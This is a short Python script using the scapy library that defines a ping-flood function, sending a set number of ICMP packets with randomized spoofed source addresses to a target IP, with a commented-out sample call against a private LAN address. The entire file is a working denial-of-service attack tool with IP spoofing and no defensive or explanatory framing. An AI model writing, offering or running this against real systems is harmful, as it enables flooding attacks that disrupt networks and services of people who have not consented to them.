from scapy.all import IP, ICMP, send
from utilities import randomIP


def PING_Flood(targetIP, numPackets):
    while numPackets > 0:
        send(IP(dst=targetIP, src=randomIP())/ICMP(), verbose=0)
        numPackets = numPackets - 1

#PING_Flood('192.168.1.220', 3000)